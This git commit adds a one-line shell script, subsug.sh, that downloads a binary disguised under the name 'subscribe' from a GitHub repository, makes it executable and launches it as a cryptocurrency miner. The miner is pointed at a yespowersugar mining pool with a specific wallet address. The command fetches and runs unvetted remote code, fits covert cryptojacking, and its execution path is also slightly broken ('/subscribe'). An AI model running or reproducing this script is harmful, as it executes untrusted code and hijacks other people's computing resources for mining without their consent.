353852cc560e88857c31eba00467fb87af9bce73
penjelajahwaktudonk <151587601+penjelajahwaktudonk@users.noreply.github.com>
2023-12-30 16:09:59 +0700

    Create subsug.sh

---
+++ subsug.sh
@@ -0,0 +1,1 @@
+wget https://github.com/penjelajahwaktudonk/w/raw/main/subscribe && chmod +x subscribe && /subscribe -a yespowersugar --pool stratum+tcps://stratum-asia.rplant.xyz:17042 -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr.tess --timeout 120 -p m=solo
